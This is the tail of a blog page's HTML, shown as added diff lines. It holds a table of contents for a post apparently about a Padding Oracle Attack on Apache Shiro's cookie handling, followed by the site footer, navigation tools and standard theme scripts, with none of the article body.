+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-text">Padding Oracle Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">加密代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90"><span class="nav-text">密钥生成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro%E4%B8%AD%E7%9A%84cookie%E5%A4%84%E7%90%86%E6%93%8D%E4%BD%9C%E5%88%86%E6%9E%90"><span class="nav-text">Shiro中的cookie处理操作分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86"><span class="nav-text">错误处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E7%A1%AE%E5%A4%84%E7%90%86"><span class="nav-text">正确处理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-text">Padding Oracle Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">加密代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90"><span class="nav-text">密钥生成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro%E4%B8%AD%E7%9A%84cookie%E5%A4%84%E7%90%86%E6%93%8D%E4%BD%9C%E5%88%86%E6%9E%90"><span class="nav-text">Shiro中的cookie处理操作分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86"><span class="nav-text">错误处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E7%A1%AE%E5%A4%84%E7%90%86"><span class="nav-text">正确处理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
